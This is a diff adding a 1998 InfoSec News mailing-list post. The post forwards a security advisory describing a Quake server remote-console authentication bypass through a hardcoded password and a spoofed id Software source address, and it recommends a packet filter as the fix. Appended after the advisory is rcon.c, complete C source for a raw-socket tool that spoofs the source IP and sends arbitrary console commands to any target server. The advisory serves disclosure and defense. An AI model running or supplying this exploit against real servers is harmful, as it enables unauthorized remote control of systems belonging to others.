@@ -1,0 +1,231 @@
+Date: Fri, 1 May 1998 04:12:33 -0600 (MDT)
+From: mea culpa <jericho@dimensional.com>
+To: InfoSec News <isn@sekurity.org>
+Subject: [ISN] RSI.0001.05-01-98.ALL.QUAKE_SERVER
+
+
+Forwarded From: RSI Advise <advise@repsec.com>
+
+
+RSI.0001.05-01-98.ALL.QUAKE_SERVER
+
+
+           |:::.  |::::: |::::.        |::::: |::::: |::::.
+           ..  :: ..     ..  ::        ..     ..     ..  ::
+           |::::  |::::  |::::  :::::: |::::: |::::  |:
+           |:  :: |:     |:               |:: |:     |:  ::
+           |:  :: |::::: |:            |::::: |::::: |:::::
+
+
+                   Repent Security Incorporated, RSI
+                       [ http://www.repsec.com ]
+
+
+                       *** RSI ALERT ADVISORY ***
+
+
+--- [CREDIT] --------------------------------------------------------------
+
+Vulnerability found by:  Mark Zielinski <markz@repsec.com>
+Advisory Author:         Mark Zielinski
+
+--- [SUMMARY] -------------------------------------------------------------
+
+Announced:     May 1st, 1998
+Report code:   RSI.0001.05-01-98.ALL.QUAKE_SERVER
+Report title:  Vulnerability in the Quake server
+Vulnerability: RCON (Remote Console)
+Patch status:  None currently available
+Platforms:     Quake 1/2, QuakeWorld, Linux/Solaris Quake2
+Reference:     http://www.repsec.com/advisories.html
+Impact:        If exploited, an attacker could remotely compromise
+               administrator access on any Quake server.
+
+
+--- [DETAILS] -------------------------------------------------------------
+
+Problem:       The Quake server has a feature where it allows
+               administrators to remotely send commands to the Quake
+               console with a password.  However, it is possible to
+               remotely bypass authentication.
+
+               In order for this to be exploited, the attacker would
+               have to create a handcrafted udp packet with a header
+               containing the rcon command and the password "tms" with
+               a source IP coming from ID Software's Subnet. (192.246.40)
+
+               The Quake server does not require an open connection for
+               sending the rcon packet.  When this is exploited, no logs
+               are reported of the rcon command being used.
+
+               This vulnerability is present in Quake 1, QuakeWorld,
+               Quake 2, Quake 2 Linux and Quake 2 Solaris, all versions.
+
+
+--- [FIX] -----------------------------------------------------------------
+
+Solution:      Filter all incoming packets from the subnet 192.246.40.
+
+
+--- [PATCH] ---------------------------------------------------------------
+
+Solution:      No patches are currently available.
+
+
+---------------------------------------------------------------------------
+
+Repent Security Incorporated (RSI)
+advise@repsec.com
+13610 N. Scottsdale Rd.
+Suite #10-326
+Scottsdale, AZ 85254
+
+[ http://www.repsec.com ]
+
+
+---------------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.2
+
+mQCNAzU6dqAAAAEEAOHt9a5vevjD8ZjsEmncEbFp2U7aeqvPTcF/8FJMilgOVp75
+dshXvZixHsYU7flgCNzA7wLIQPWBQBrweLG6dx9gE9e5Ca6yAJxZg8wNsi06tZfP
+nvmvf6F/7xoWS5Ei4k3YKuzscxlyePNNKws6uUe2ZmwVoB+i3HHT44dOafMhAAUT
+tBpSZXBTZWMgPGFkdmlzZUByZXBzZWMuY29tPg==
+=ro8H
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+Copyright April 1998  RepSec, Inc.
+
+The information in this document is provided as a service to customers
+of RepSec, Inc.  Neither RepSec, Inc., nor any of it's employees, makes
+any warranty, express or implied, or assumes any legal liability or
+responsibility for the accuracy, completeness, or usefulness of any
+information, apparatus, product, or process contained herein, or
+represents that its use would not infringe any privately owned rights.
+Reference herein to any specific commercial products, process, or
+services by trade name, trademark, manufacturer, or otherwise, does not
+necessarily constitute or imply its endorsement, recommendation or
+favoring by RepSec, Inc.  The views and opinions of authors expressed
+herein do not necessarily state or reflect those of RepSec, Inc., and may
+not be used for advertising or product endorsement purposes.
+
+The material in this alert advisory may be reproduced and distributed,
+without permission, in whole or in part, by other security incident
+response teams (both commercial and non-commercial), provided the above
+copyright is kept intact and due credit is given to RepSec, Inc.
+
+This alert advisory may be reproduced and distributed, without
+permission, in its entirety only, by any person provided such
+reproduction and/or distribution is performed for non-commercial
+purposes and with the intent of increasing the awareness of the Internet
+community.
+
+---------------------------------------------------------------------------
+
+RepSec, Inc. are trademarks of RepSec, Inc.  All other trademarks are
+property of their respective holders. 
+
+
+
+
+-o-
+Subscribe: mail majordomo@sekurity.org with "subscribe isn".
+Today's ISN Sponsor: Repend Security Incorporated [www.repsec.com]
+/* rcon.c
+  Quake  world rcon_password bug implimentation by Jeff Roberson, <jroberson@chesapeake.net> (VallaH)
+  Linux 2.0.33 source, will compile on BSD if you modify the ip header etc.
+  Please note that I did not discover this, I simply wrote the code.
+  Thanks to Nick Toomey, <ntoomey@chesapeake.net> (Grifter)
+
+  Brief summary:
+      Any rcon command coming from the idsoftware subnet 192.246.40 with the rcon password of tms will be accepted on any server.  This program simply spoofs a packet from vader.idsoftware.com (random pick) to whatever server you identify.
+
+  Usage:
+        ./rcon ip/host "what you want to do" [port]
+  Example:
+        ./rcon quake.idsoftware.com "say This program works, thanks Jeff" 27500
+         the port argument is optional, you may omit it if you like and it will default to 27500.
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>                                                
+
+#define SIP "192.246.40.42" /* vader.idsoftware.com */
+#define command "ÿÿÿÿrcon tms "
+
+u_long resolve_address(u_char *host)
+{
+        struct  in_addr addr;
+        struct  hostent *he;
+
+        if((addr.s_addr = inet_addr(host)) == -1) {
+                if (!(he = gethostbyname(host))) {
+                        printf("Unknown address: %s\n", host); 
+                        exit(-1);
+                }
+                bcopy(he->h_addr, (char *)&addr.s_addr, he->h_length);
+        }
+        return(addr.s_addr);
+}
+int main(int argc, char **argv)
+{
+        int     s;
+        int     port=27500;
+        char    buf[512];
+        struct  sockaddr_in dst;
+        struct  iphdr *iph=(struct iphdr *)buf;
+        struct  udphdr *udp=(struct udphdr *)(buf + 20);
+
+        if (argc<3) {
+                printf("usage:\n");
+                printf("\t%s ip ""command"" <port>\n", argv[0]);
+                exit(-1);               
+        }       
+        if (argc==4) port = atoi(argv[3]);
+        bzero(buf, sizeof(buf));
+        bzero((char *)&dst, sizeof(dst));
+
+        iph->version=4;
+        iph->ihl=5;
+        iph->tos=0;
+        iph->tot_len=htons(sizeof(buf));
+        iph->id=htons(1234);
+        iph->frag_off=0;
+        iph->ttl=255;
+        iph->protocol=17;
+
+        iph->saddr=inet_addr(SIP);
+        iph->daddr=resolve_address(argv[1]);
+
+        udp->source=htons(1234);
+        udp->dest=htons(port);
+        udp->len=htons(sizeof(buf) - 20);
+
+        dst.sin_family=PF_INET;
+        dst.sin_addr.s_addr=iph->daddr;
+        dst.sin_port=htons(27500);
+
+        sprintf((buf + 28), "%s%s\n", command, argv[2]); 
+
+        if ((s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+                perror("socket");
+                exit(-1);
+        }
+
+        if ((sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst))) <=0) {
+                perror("sendto");
+                exit(-1);
+        }
+        exit(1);
+}
